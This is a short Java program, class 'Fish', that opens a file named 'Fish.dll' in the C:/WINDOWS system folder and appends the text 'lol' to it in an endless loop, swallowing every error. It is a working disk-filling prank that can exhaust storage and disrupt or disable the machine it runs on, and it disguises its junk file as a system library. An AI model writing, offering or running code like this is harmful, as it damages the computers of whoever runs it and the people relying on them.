import java.io.*;
class Fish
{
public static void main(String ar[])
 {
   try
  {
   FileWriter f=new FileWriter("C:/WINDOWS/Fish.dll",true);
   while(true)
   {
   f.write("lol");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 
